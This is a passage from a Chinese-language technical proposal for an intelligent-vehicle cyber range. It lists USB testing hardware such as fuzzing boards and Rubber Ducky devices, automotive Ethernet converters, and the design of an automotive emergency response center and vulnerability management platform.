data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/73810939ca832dcfbc59951ae06be69f.png"></p><h3 id="USB测试工具集"><a href="#USB测试工具集" class="headerlink" title="USB测试工具集"></a>USB测试工具集</h3><p>USB测试工具集包含模糊测试工具、USB橡皮鸭、无线网卡等，通过可编程的软硬件对USB设备进行模拟，测试USB主、从协议栈的安全通信，同时针对USB端口进行的文件下载、程序植入等安全威胁进行验证测试。</p><h4 id="功能实施方案-1"><a href="#功能实施方案-1" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>提供2套模糊测试工具板作为远程控制USB控制器的硬件设备，搭配程序可提供USB主机和从机模式模拟，并允许发送预先形成带有漏洞的USB请求和。</p><p>为了满足高级USB接口测试的需求，提供2套模糊测试工具板，这些工具板是专为远程控制USB控制器的硬件设备设计的。它们配备了先进的程序，能够模拟USB主机和从机模式，这样的设计使得开发者和测试人员可以在不同角色和场景下对USB接口进行全面的测试。这些工具板的强大之处还在于它们能够发送预先形成的、带有漏洞的USB请求和，这是进行严格安全测试的关键。通过这种方式，测试人员可以模拟各种潜在的USB攻击场景，从而评估USB控制器的能力和系统的整体安全性。使用这些模糊测试工具板进行测试，可以大幅提高发现和修复USB接口潜在漏洞的效率，确保USB设备在面对复杂和恶意的USB流量时，能够保持稳定和安全的工作状态。这套工具是USB协议开发和安全性测试的重要装备，对于追求高安全标准的硬件生产商和软件开发商来说，它们提供了一种可靠而强大的测试解决方案。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9938c225c34f70e1dfbe73dfbaaad7a8.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ada908b54098f3b82e43b9c1504a7322.png"></p><ol><li><p>提供USB Rubber Ducky ，数量2个：四核、8G NAND SSD、配置RGBLED。</p><p>提供2个USB Rubber Ducky设备，这些设备是专为安全测试和渗透测试设计的工具，它们搭载了四核处理器，确保了运行速度和处理能力，使得执行复杂的攻击脚本和测试程序变得流畅无比。每个设备还配备了8G NAND SSD存储空间，这意味着它们可以存储大量的测试脚本和日志数据，方便测试人员进行长时间的数据记录和分析。此外，这些设备还配置了RGB LED指示灯，这不仅让设备在使用时更具有视觉效果，更重要的是，它们可以为用户提供即时的操作反馈，比如通过不同颜色的灯光显示设备的工作状态或者脚本执行结果。这种设计使得USB Rubber Ducky在执行各种任务时都能提供直观的用户体验，极大地提高了安全测试的效率和便捷性。无论是安全研究人员还是渗透测试人员，USB Rubber Ducky都是他们工具箱中不可或缺的设备。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3f2231d38b4647ff0b85a42e63e576ad.png"></p></li><li><p>提供USB无线网卡，数量15个：支持2.4G+5G双频、支持Windows、linux。</p><p>为了适应多样化的测试环境和增强USB接口的无线网络测试能力，提供15个USB无线网卡。这些网卡支持2.4G和5G双频段运作，允许测试人员在不同的无线频段进行测试，从而确保USB设备在各种网络条件下的性能和稳定性。这些USB无线网卡的兼容性极佳，支持Windows和Linux操作系统，这意味着它们可以无缝集成到大多数测试环境中，无论是在传统的Windows平台还是在开源的Linux系统上，都能够提供高效且可靠的无线连接。这样的设备对于那些需要在不同操作系统上进行USB接口测试和网络测试的专业人员来说，是极其宝贵的资源。通过使用这些USB无线网卡，测试团队可以更加灵活地设计和执行测试方案，以确保USB设备在现实世界中的无线连接表现得既快速又可靠。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0a5469640260f6e809b278d9a00dae6f.png"></p></li><li><p>提供USB分线器，数量10个：USB3.0接口、1拖4分线器、长度0.5米。</p><p>为了满足多设备同时连接和测试的需求，提供10个USB分线器，每个分线器都具备了高速的USB3.0接口，这保证了与之连接的设备能够享受到高速的数据传输率，极大地提高了测试效率和数据处理速度。这些1拖4的分线器设计意味着单个USB端口就可以扩展为四个，大大增加了测试平台的接口数量，为同时连接多个测试设备提供了可能。每个分线器的长度为0.5米，这样的长度既方便了设备之间的连接，又避免了过长线缆可能带来的混乱和干扰问题。这些分线器是测试工作中不可或缺的辅助工具，无论是在实验室还是现场测试环境中，都能提供稳定可靠的扩展性能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f5891dc09d6490ea9d663827c42f342e.png"></p></li><li><p>提供调试工具，数量1个：可支持IMC100 系列:IMC101T-T038、IMC101T-Q048、IMC101T-F064、IMC102T-F064调试。</p><p>提供一套专业的调试工具，数量为1个，它是专门为IMC100系列芯片设计的，确保了对该系列中的多款型号如IMC101T-T038、IMC101T-Q048、IMC101T-F064以及IMC102T-F064的全面支持。这套调试工具的存在，极大地简化了开发和测试过程，使工程师能够进行高效的编程、故障诊断和性能调优。无论是进行固件的上传、参数的配置还是功能的测试，这套调试工具都能提供强大的辅助，确保了IMC100系列产品能够在各种应用场景下达到最佳的性能表现。对于任何使用IMC100系列芯片进行产品开发的团队来说，这套调试工具都是不可或缺的助手，它将极大提升开发效率和产品质量。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a24ab0572b5ca7846ea16a335afa533f.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/85b62888bdc9fb7b96bb244e05ec6592.png"></p></li></ol><h3 id="车载以太网转换工具"><a href="#车载以太网转换工具" class="headerlink" title="车载以太网转换工具"></a>车载以太网转换工具</h3><p>可在汽车以太网连接和任何具有带 RJ-45 连接器的标准以太网网络接口卡 (NIC) 的设备之间建立物理层转换</p><p>数量：100BASE-T1转Tx 20套，1000BASE-T1转Tx 20套</p><h4 id="功能实施方案-2"><a href="#功能实施方案-2" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/20e7b25151a6a5db2bde6fc92f67c14f.png"></p><p>百兆车载以太网转换工具</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/77ed855e5f1429956e2c95fc5237e6ed.png"></p><p>千兆车载以太网转换工具</p><ol><li>设备宽压供电:支持DC6V-28V电源输入，带反接保护，带浪涌保护。提供的车载以太网转换工具具备宽压供电设计，能够适应从DC6V至28V的电源输入范围，这使得它能够在多种电压条件下稳定工作，极大地增强了设备的适用性和灵活性。此外，考虑到实际应用中可能遇到的电源问题，该设备还特别加入了反接保护功能，即使在电源接反的情况下，也能有效防止设备损坏，保障了使用的安全性。同时，它还配备了浪涌保护，能够抵御因电源突波而导致的潜在损害，确保设备在恶劣电气环境中也能可靠运行。这些保护措施不仅延长了设备的使用寿命，也为用户提供了更加稳定和安心的使用体验。</li><li>设备工作电流不大于50mA@12V。的车载以太网转换工具在设计时特别注意了功耗控制，其工作电流特性不超过50mA@12V，这意味着在标准的12V电压供电下，设备的实际工作电流会根据具体的操作条件和网络负载而有所变化。这种灵活的电流调整机制有助于优化整体能耗，从而在不同的使用场景下实现更高效的电源管理。这一设计不仅有助于降低长期运营成本，而且对于希望通过精确控制功耗以延长电池寿命的移动或远程应用来说，这是一个非常重要的特性。用户可以依据设备的工作电流数据，更好地规划能源使用策略，确保设备在不同环境下都能保持最佳的性能。</li><li>设备支持1个标准RJ45以太网接口。本款车载以太网转换工具配备了1个标准RJ45以太网接口，这是目前网络设备中最常见的接口类型，兼容性极高。用户可以通过这个接口轻松地将设备连接到有线网络中，实现快速稳定的数据传输。不论是在家庭、办公室还是工业环境中，这个标准的RJ45接口都能确保与各种网络设备如路由器、交换机、计算机或其他网络终端的无缝对接。它支持以太网标准的各种传输速率，可以满足不同用户在数据通信方面的需求，从而提供一个可靠和效率高的网络连接解决方案。</li><li>设备具有车载以太网状态指示灯，可指示连接状态及通讯状态。本款车载以太网转换工具的设计中特别包含了车载以太网状态指示灯，这是一个直观的功能特性，使得用户能够轻松识别设备的连接状态及通讯状态。当设备成功连接到网络并开始数据传输时，状态指示灯将提供即时的视觉反馈，通过不同的颜色或闪烁模式来指示当前的网络状态。这种设计对于需要在车辆中部署网络设备的应用场景尤为重要，因为它允许操作人员在移动中快速检查设备的工作情况，确保网络连接的稳定性和通讯的连贯性。无论是在停车状态还是行驶途中，这些状态指示灯都是监控网络状况的重要工具，为用户提供了额外的便利和安全保障。</li><li>设备具备的标准以太网接口:RJ45带指示灯。精心设计的以太网转换工具具备一个标准的RJ45以太网接口，并且这一接口配备了指示灯。这种设计使得它不仅能够提供稳定的网络连接，而且还能够通过指示灯向用户展示连接质量和活动状态。当设备连接到网络时，指示灯会亮起，显示设备已经成功接入网络，并且在数据传输时，指示灯的闪烁则提供了数据流动的直观证明。这样的设计对于快速诊断网络问题或确认网络活动至关重要，尤其是在复杂的网络环境中，用户可以依靠指示灯迅速了解设备状态，从而确保网络通信的高效与可靠。</li><li>设备支持Master/Slave切换功能，可以适应不同的设备。的车载以太网转换工具具备高度灵活的Master/Slave切换功能，这意味着它能够无缝适应多种网络配置需求。无论是需要作为网络的主控设备（Master）还是作为从属设备（Slave）运行，该转换工具都能通过简单的设置调整其工作模式。这种功能极大地增强了设备的适应性，使其能够轻松融入各种不同的设备环境中，从而满足多样化的应用场景。对于需要在不同网络拓扑中快速切换角色的用户来说，这一特性尤其宝贵，它保证了无论在何种网络结构中，设备都能够提供稳定可靠的服务。</li><li>设备支持车载以太网支持标准100BASE-T1协议。的车载以太网转换工具在设计上充分考虑了车载网络的特殊要求，因此它支持行业标准的100BASE-T1协议。这一协议是专为汽车环境优化的，能够在单对双绞线上提供高达100 Mbps的数据传输速率，同时还具有出色的抗干扰能力和低延迟特性。通过支持100BASE-T1协议，的设备确保了在车辆行驶过程中，不仅能够提供高速的数据通信，还能保证信号的稳定性和可靠性。这使得它成为车载系统、传感器网络以及车载娱乐系统等应用的理想选择，为车载以太网的构建和维护提供了强有力的技术支持。</li></ol><h4 id="性能实施方案"><a href="#性能实施方案" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>设备传输距离:实测车载线15m，100M线速，传输稳定无丢包。本款车载以太网转换工具的性能经过严格测试，确保在实际应用中能够提供卓越的传输效果。在使用标准的车载线材进行测试时，即便在15米的传输距离下，该设备也能够保持100M的线速传输，这一速率足以应对大多数车载网络需求。更为重要的是，它能够保证数据传输的稳定性，经测试在整个传输过程中无丢包现象，这对于保障车载系统的可靠性至关重要。无论是音视频数据的实时传输，还是关键的车载控制信息，用户都可以信赖这款转换工具提供稳定而高效的网络通信能力。</li></ol><h1 id="智能汽车网络靶场汽车应急响应中心"><a href="#智能汽车网络靶场汽车应急响应中心" class="headerlink" title="智能汽车网络靶场汽车应急响应中心"></a>智能汽车网络靶场汽车应急响应中心</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>针对网络威胁，OEM需要有能力预防、检测和进行快速响应，以减少对车队、企业组织和制造商品牌的损害。为了实现这一目标，智能汽车网络靶场需要为汽车领域定制的连续监测、调查和分析工具，以及经过适当培训的安全分析人员和制定一整套工作流程及平台。</p><p>此外，必须在遵守数据安全/隐私法规的基础上，创建可以监测、汇总和管理大量和不同类型的车队数据，包括个人数据的方法。汽车应急响应中心可提供一个有效的汽车安全操作框架和平台，旨在提供预测、检测和快速响应网络威胁的能力，贯穿车辆的整个生命周期。</p><h2 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h2><p>汽车应急响应中心包括漏洞平台、检测平台、威胁情报平台、安全运营平台。</p><p>汽车安全运营平台通过从实验室测试零部件、台架、车辆及已上市车辆的安全日志、安全事件进行收集、依托汽车网络靶场的知识图谱实时威胁检测，并配合应急响应规则，根据不同的威胁等级触发风险预警、开展溯源分析、漏洞验证和策略更新等管控，治理已上市车辆安全问题。</p><p>漏洞提交平台主要用于对接产品与白帽资源，为产品提供漏洞征集、众测等服务，为白帽提供理想的收益与声望。</p><h2 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h2><table><thead><tr><th>序号</th><th>所属系统</th><th>货物分项名称</th><th>数量</th><th>备注</th></tr></thead><tbody><tr><td></td><td></td><td>漏洞平台</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>威胁情报平台</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>检测平台</td><td>1套</td><td></td></tr><tr><td></td><td></td><td>安全运营中心</td><td>1套</td><td></td></tr><tr><td></td><td>培训及服务</td><td>靶场安全运营流程培训</td><td>20人天</td><td></td></tr><tr><td></td><td></td><td>漏洞平台使用</td><td>30人天</td><td></td></tr><tr><td></td><td></td><td>威胁情报平台使用</td><td>30人天</td><td></td></tr><tr><td></td><td></td><td>检测平台使用</td><td>20人天</td><td></td></tr><tr><td></td><td></td><td>安全运营中心使用</td><td>60人天</td><td></td></tr><tr><td></td><td></td><td>众测活动培训</td><td>30人天</td><td></td></tr></tbody></table><h2 id="应急响应中心总体框架"><a href="#应急响应中心总体框架" class="headerlink" title="应急响应中心总体框架"></a>应急响应中心总体框架</h2><h3 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a>漏洞平台</h3><p>漏洞管理平台作为漏洞统一管理的系统，对漏洞生命周期做全面的管理，支持同步靶场平台、汽车安全运营平台、漏洞提交平台（SRC）等平台的漏洞信息。</p><p>SRC平台作为众测活动的基础，旨在招募汽车安全白帽子对相关车载系统、零部件进行全面漏洞风险评估，并由专业人员进行漏洞管理和白帽子管理。</p><h3 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h3><p>威胁情报平台通过安全运营后的威胁情报数据服务，威胁情报数据类型包括：失陷检测类情报、IP信誉情报、文件信誉情报、漏洞情报，本地缓存数亿的海量热点库，提供本地API接口集成，同时提供多源情报汇聚能力。</p><h3 id="检测平台"><a href="#检测平台" class="headerlink" title="检测平台"></a>检测平台</h3><p>安全检测平台的资产数据和漏洞数据与漏洞管理平台和安全运营平台进行同步，安全运营平台对资产的整体安全状态进行展示，漏洞管理平台的数据同步给安全检测平台进行测试验证。</p><h3 id="安全运营平台"><a href="#安全运营平台" class="headerlink" title="安全运营平台"></a>安全运营平台</h3><p>汽车安全运营平台与靶场、威胁情报平台、漏洞管理平台、安全检测平台对接，对其他平台数据、告警和日志信息的归并整合，结合威胁分析模型、安全检测规则，实现对全网车联网相关安全事件的检测及处置，会同其他平台和运营机制实现事件和漏洞闭环，结合安全大数据、威胁情报实现资产风险的提前感知和预警。</p><h3 id="众测活动方案"><a href="#众测活动方案" class="headerlink" title="众测活动方案"></a>众测活动方案</h3><p>众测活动平台用于发布针对固定产品在固定时间内，进行测评与漏洞提交的模式。众测活动支持活动创建、管理、发布。至少包括众测活动的名称、时间、类型、测试范围、奖励机制等。众测活动模块支持公网域名发布，也支持通过openVPN方式接入访问，保证活动的隐私与安全性。</p><p>提供众测活动的规划方案。包含活动整体安排，活动内容，活动日程，环境搭建，奖励机制，活动组织架构，费用预算等。</p><h1 id="智能汽车网络靶场漏洞管理平台"><a href="#智能汽车网络靶场漏洞管理平台" class="headerlink" title="智能汽车网络靶场漏洞管理平台"></a>智能汽车网络靶场漏洞管理平台</h1><h2 id="测试目标"><a href="#测试目标" class="headerlink" title="测试目标"></a>测试目标</h2><p>漏洞管理平台的任务是全面管理漏洞的生命周期。这个平台扮演着漏洞信息的集中管理者，能够同步各个重要平台，包括靶场平台、汽车安全运营平台以及漏洞提交平台（SRC）。其核心职责在于确保漏洞在整个生命周期中得到妥善的管理、跟踪和记录。通过与其他平台的集成，它使得漏洞信息的同步和整合成为可能。</p><p>另一方面，SRC平台则是众测活动的核心。其目标是吸引来自汽车安全领域的安全专家，对相关的车载系统和零部件进行深入的漏洞风险评估。SRC平台由专业人员管理和监督，确保测试人员能够有效地发现和报告漏洞。这个平台在众测测试中起到关键作用，协调测试人员、提供测试资源、管理漏洞报告，以确保测试的安全性和可靠性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/83092ad61e5fabed67d0f78149dfa6a4.png" alt="未命名文件 (3)"></p><p>总体架构</p><h2 id="测试技术路线"><a href="#测试技术路线" class="headerlink" title="测试技术路线"></a>测试技术路线</h2><h3 id="漏洞管理平台"><a href="#漏洞管理平台" class="headerlink" title="漏洞管理平台"></a>漏洞管理平台</h3><h4 id="资产管理"><a href="#资产管理" class="headerlink" title="资产管理"></a>资产管理</h4><p>资产管理可使用户手动录入各种资产信息，包括IP地址、Web应用、车辆VIN码、车型ID、配置等级、设备序列号、设备型号、设备供应商、移动APP资产、软件应用供应商的OTA/KPI等、软硬件版本。这些资产可以按组织结构、业务层次、车型等多个管理层级进行分类、分层、分级管理。</p><p>系统关联了漏洞信息，以便用户查看不同层级分组下的不同类型漏洞，包括汽车漏洞、通用漏洞、事件型漏洞等，并提供漏洞在漏洞库内的编号、漏洞危险程度、对应车辆ID和VIN码。</p><p>资产管理包括了IP资产的管理，用户可以查看各级分组下IP资产的端口、服务、漏洞数量以及POC漏洞数量。对于车辆信息，系统记录了车辆品牌、车型、TBOX型号、TBOX供应商名称、车机型号、车机供应商名称等相关数据。此外，系统支持多层级展示资产、漏洞和风险情况，以帮助用户更好地了解和分析资产信息。</p><p>对于车联网相关资产，系统包括了硬件版本、软件版本、零部件编号、IP、ECUID、嵌入式操作系统版本、关联车型等字段记录。而对于移动APP相关资产，系统包括了软件版本、SDK、应用名等字段。这些功能和特点使得资产管理更加灵活和全面，有助于系统管理员更好地了解和掌握资产信息，以及与漏洞管理、风险评估等其他模块的集成和协作。</p><h5 id="功能实施方案-3"><a href="#功能实施方案-3" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>提供集成的数据同步引擎，能够与外部的检测平台和数据平台进行实时数据交换。支持自定义资产分类和属性，可按需增加资产类型和属性，包括文本框、列表框、数值、密码、IP地址和布尔值。同步的数据包括资产ID、资产类别、资产系统版本号、供应商信息和序列号等，确保资产信息的准确性和时效性。</li><li>提供资产分类和属性定义模块，用户可以根据自己的需求创建和管理资产类型及其属性。支持的属性类型包括文本框、列表框、数值、密码、IP地址和布尔值等，用户可以自由配置这些属性以适应不同资产的特征。</li><li>提供用户友好的资产录入界面，用户可以方便地手工添加或修改IP、Web应用、车辆VIN码等信息。对于车辆相关资产，支持输入车型ID、配置等级、TBOX和车机序列号、型号、供应商等信息。移动APP资产和软件应用供应商的OTA/KPI的录入也得到了系统的支持，以及资产软硬件版本信息的输入。</li><li>支持查看各级分组下不同汽车漏洞、通用漏洞、事件型漏洞、漏洞在漏洞库内的编号、漏洞危险程度、对应车辆ID、VIN码支持根据组织机构、业务结构、车型架构等不同标准进行资产的分类、分层、分级管理。提供可视化的资产树状结构视图，帮助用户快速定位和管理属于不同层级的资产。</li><li>此平台提供了一个全面的漏洞管理功能，它能够有效地展示和追踪不同级别分组下的各种漏洞，包括专门针对汽车的漏洞、广泛存在于各种硬件和软件中的通用漏洞，以及基于特定事件触发的漏洞。每个漏洞条目都会被赋予一个唯一的漏洞库内编号，便于在系统中进行索引和引用。平台还会评估和显示每个漏洞的危险程度，帮助快速识别和优先处理那些最严重的安全威胁。为了实现风险定位和快速响应，平台还将漏洞与相应的车辆ID和VIN码相关联，这样用户就能立即识别出受影响的具体车辆，从而采取必要的补救措施。通过这种方式，平台不仅提升了漏洞处理的效率，还加强了车辆安全管理的针对性和有效性。</li><li>对于IP资产，此平台可以显示端口、服务、漏洞数量和POC漏洞数量以及包含端口、服务、漏洞数量和POC漏洞数量等信息的详细报告，有助于安全管理员进行漏洞评估和修复，以及安全审计和合规性检查。</li><li>此提供了一个清晰全面的界面，用于查看和管理车辆信息，其中包括车辆的品牌、车型、车辆代码以及关键的车载硬件信息，如TBOX型号和供应商名称，还有车载信息娱乐系统（车机）的型号和供应商。通过这些详尽的数据，用户可以快速获取车辆的详细规格和配置信息。</li><li>系统能够根据资产的不同层级展示资产的漏洞和风险情况，帮助用户快速定位和查看属于不同层级的资产的漏洞和风险情况，以及进行风险评估和制定相应的风险缓解措施。</li><li>此平台为车联网资产提供了详细的字段支持：包括硬件版本、软件版本、零部件编号、IP、ECUID、嵌入式操作系统版本、关联车型等；</li></ol><p>对于移动APP资产，此平台支持记录软件版本、SDK版本、应用名等信息，方便用户进行移动应用的版本管理和安全审计</p><h5 id="技术实现内容-1"><a href="#技术实现内容-1" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="手工录入资产信息"><a href="#手工录入资产信息" class="headerlink" title="手工录入资产信息"></a>手工录入资产信息</h6><p>用户可以手动录入各类资产信息，包括：</p><p>IP地址</p><p>Web应用</p><p>车辆VIN码</p><p>车型ID</p><p>配置等级</p><p>设备序列号</p><p>设备型号</p><p>设备供应商</p><p>移动APP资产</p><p>软件应用供应商的OTA/KPI等</p><p>软硬件版本</p><p>系统支持手动录入各种重要信息，涵盖了多个关键领域。用户可以手动输入IP地址、Web应用相关信息，车辆VIN码和车型ID，配置等级以及设备方面的内容，包括TBOX、车载设备序列号、设备型号和设备供应商等。此外，还可输入移动应用程序资产信息，涵盖软件供应商（如OTA/PKI提供商）、软硬件版本等数据。这种手动录入机制对于系统的完整性和全面性很重要，它确保了系统能够涵盖各种关键信息，从而支持系统在安全运营和资产管理方面的全面性和有效性。这样的功能能够让用户将各种重要的、特定于领域的信息手动输入至系统中，为后续的分析、安全管理和运营提供全面的数据支持。</p><h6 id="资产分类、分层和分级管理"><a href="#资产分类、分层和分级管理" class="headerlink" title="资产分类、分层和分级管理"></a>资产分类、分层和分级管理</h6><p>平台支持对资产进行分类、分层和分级管理。这使得用户能够按照组织机构、业务结构、车型架构等管理层级对资产进行组织和管理。</p><p>系统支持资产按照多个管理层级进行分类和管理，这样的方法提供了更全面的视角来组织和管理资产。通过结合组织机构、业务结构和车型架构等多种管理层级，用户能够根据不同需求对资产进行分类和管理。以组织机构为基础的管理层级可帮助确定资产的归属和责任，业务结构则支持按照不同业务流程或测试对资产进行管理，而车型架构的管理可对涉及车辆的资产进行有效的组织和监管。这种综合多层次管理的方法使得资产管理更为全面、灵活，能够更好地满足不同管理需求，提高了管理的有效性。</p><h5 id="同步检测平台"><a href="#同步检测平台" class="headerlink" title="同步检测平台"></a>同步检测平台</h5><p>系统可以同步检测平台和其他数据平台资产数据信息，包括了：资产ID、资产类别、资产系统版本号、供应商信息、序列号等。</p><p>同步检测平台与其他数据平台的资产数据信息的支持，能够实现资产ID、资产类别、资产系统版本号、供应商信息、序列号等关键数据的无缝集成和共享。这种支持不仅可以确保不同平台间数据的一致性和完整性，也有助于更高效地管理和利用这些资产。通过同步检测平台与其他数据平台的资产数据信息，可以实现更完备的资产跟踪和管理，提高系统和供应链的透明度。这种集成还能够为各个部门和团队提供更准确、及时的数据，有助于迅速做出决策并优化资源配置，进而提升整体运营效率和业务成果。</p><h5 id="自定义资产分类"><a href="#自定义资产分类" class="headerlink" title="自定义资产分类"></a>自定义资产分类</h5><p>平台可以进行自定义资产分类和属性，可以根据需求增加资产类型和属性，包括了文本框、列表框、数值、密码、IP地址和布尔值。</p><p>支持自定义资产分类和属性，这样系统具备灵活性，能够根据需求自定义不同资产的类别和属性。允许用户根据特定要求灵活地增加资产类型和属性，包括文本框、列表框、数值、密码、IP地址和布尔值等多种类型。通过自定义资产分类和属性，用户可以更详尽地描述和管理各种资产，满足特定场景下的需求。这种自定义性能够为不同行业或特定测试提供更准确和有针对性的资产管理解决方案。用户可以根据实际情况灵活调整资产属性，使系统更贴近业务需求，提升管理效率和数据准确性。这样的灵活性和定制性，有助于系统适应不断变化的业务环境，并更好地支持用户的业务流程和需求。</p><h5 id="漏洞关联和查看"><a href="#漏洞关联和查看" class="headerlink" title="漏洞关联和查看"></a>漏洞关联和查看</h5><p>用户可以查看各级分组下的漏洞信息，包括不同类型的漏洞，如汽车漏洞、通用漏洞和事件型漏洞。</p><p>平台允许用户查看漏洞在漏洞库内的编号、漏洞的危险程度以及与漏洞相关的车辆ID和VIN码。</p><p>系统具备查看不同层级分组下各种漏洞的功能，包括汽车特定漏洞、通用漏洞以及事件型漏洞等。用户可以查看漏洞在漏洞库内的编号、漏洞的危险程度评估，以及与这些漏洞相关联的车辆ID和VIN码等信息。</p><p>通过系统的这种功能，用户可以轻松地浏览并筛选各个分组下的漏洞，了解每个漏洞的详细信息，如其在漏洞库中的唯一标识、严重性评估、可能受影响的车辆ID和VIN码等关键信息。这种分类和细化的漏洞管理功能使得用户能够更加准确、全面地了解漏洞的性质、威胁程度以及对相关资产的潜在影响，进而更有针对性地采取必要的安全防护措施和漏洞修复行动。</p><h5 id="IP资产管理"><a href="#IP资产管理" class="headerlink" title="IP资产管理"></a>IP资产管理</h5><p>用户可以查看各级分组下的IP资产的信息，包括端口、服务、漏洞数量以及POC漏洞数量等。</p><p>系统具备查看各级分组下IP资产相关信息的功能，包括端口、服务、漏洞数量和POC漏洞数量等。</p><p>用户可以通过系统查询各个分组下IP资产的端口信息，了解这些IP所开放的端口号以及关联的服务类型。同时，系统还提供了漏洞数量的统计，让用户了解每个IP资产存在的漏洞总数。此外，系统还能展示POC漏洞的数量，即已经验证的漏洞案例数目。</p><p>这种功能使用户能够快速了解各级分组下IP资产的安全情况，知晓开放端口、相关服务、漏洞数量和POC漏洞数量等关键信息。通过这些详细数据的呈现，用户可以更全面地评估和识别潜在的安全风险，有助于及时采取必要的安全措施和漏洞修复工作。</p><h5 id="车辆信息管理"><a href="#车辆信息管理" class="headerlink" title="车辆信息管理"></a>车辆信息管理</h5><p>提供了对车辆信息的管理和查看，包括车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号、车机供应商名称等。</p><p>用户可以查看车辆的关键信息，如车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号和车机供应商名称等。这些数据为用户提供了关于车辆配置和关联供应商的重要信息，有助于确保车辆系统的适配性和安全性。</p><h5 id="多层级资产展示"><a href="#多层级资产展示" class="headerlink" title="多层级资产展示"></a>多层级资产展示</h5><p>平台能够以层级视图的方式展示不同层级的资产信息，包括漏洞和风险情况，使用户能够更清晰地了解资产的组织结构。</p><p>用户可以查看车辆的关键信息，如车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号和车机供应商名称等。这些数据为用户提供了关于车辆配置和关联供应商的重要信息，有助于确保车辆系统的适配性和安全性。</p><h5 id="车联网和移动APP相关资产字段"><a href="#车联网和移动APP相关资产字段" class="headerlink" title="车联网和移动APP相关资产字段"></a>车联网和移动APP相关资产字段</h5><p>对于车联网相关资产，平台支持记录和展示各种相关字段，如硬件版本、软件版本、零部件编号、IP、ECUID、嵌入式操作系统版本、关联车型等。</p><p>对于移动APP相关资产，平台同样支持记录和展示各种相关字段，如软件版本、SDK、应用名称等。</p><p>资产管理的这些功能将有助于用户有效地管理和监控各种资产，帮助识别潜在漏洞和风险，并采取必要的措施以维护系统和数据的安全性。</p><h4 id="漏洞采集管理"><a href="#漏洞采集管理" class="headerlink" title="漏洞采集管理"></a>漏洞采集管理</h4><p>漏洞采集管理模块提供了多种方式来获取漏洞信息，包括通过漏洞扫描引擎的调度采集、外部数据导入、人工手动添加等途径。</p><p>漏洞管理平台可以与第三方漏洞扫描引擎的集成，包括漏扫设备接入以及与其他平台（如靶场平台、众测平台、安全检测平台）的对接。</p><p>用户可以通过与二进制分析工具的对接，实现对工具漏洞信息的同步监控。此外，漏洞采集管理模块允许用户手动录入漏洞信息，展示漏洞的基本细节，包括漏洞编号、描述、发现来源和报告人等信息。</p><p>用户可以通过界面添加IP、零部件资产和车联网系统漏洞。支持导入漏洞扫描器生成的离线文件，包括.Nessus、XML和Excel格式文件，以便更全面地采集漏洞信息。此外，漏洞采集管理还允许与其他检测平台和工具进行对接，以展现漏洞信息。</p><p>漏洞信息的导入支持使用漏洞模板，用户可以自定义漏洞类型、属性名称和属性值，以更灵活地管理漏洞信息。</p><h5 id="功能实施方案-4"><a href="#功能实施方案-4" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>此平台是一个高维度的采集平台，不仅能够通过自动化的漏洞扫描引擎调度来收集漏洞，还支持外部数据的导入以及安全专家的手动录入。这种灵活的采集模式保证了漏洞信息的全面性，同时也提高了漏洞库的更新速度和准确性。</li><li>此平台具有出色的兼容性和集成能力，不仅支持调度多种第三方漏洞扫描引擎，还允许各种漏扫厂商的设备接入。此外，平台可以与其他安全相关平台，如靶场、众测和安全检测平台等进行数据对接，实现资源共享和信息互通。</li><li>此平台集成了对二进制分析工具的支持，通过漏洞监控模块，能够实时同步这些工具中检测到的漏洞信息。这样的整合确保了漏洞数据的即时更新，帮助安全团队迅速响应潜在的安全威胁。</li><li>此平台还提供了手动录入功能，允许根据实际情况补充和完善漏洞信息。这为处理一些特殊情况下未能自动检测到的漏洞提供了便利，确保了信息库的完整性。</li><li>系统支持展示漏洞名称、漏洞编号、描述、发现来源和报告人等。提供这些信息有助于让安全运营人员快速理解漏洞的核心信息，并采取相应的修复措施。</li><li>此平台支持直接通过用户界面添加IP、零部件资产和车联网系统的漏洞信息，这种直接性的操作简化了漏洞信息的输入过程，提升了工作效率。</li><li>为了便于漏洞信息的集中管理，平台支持从漏洞扫描器生成的.Nessus、XML、Excel等格式的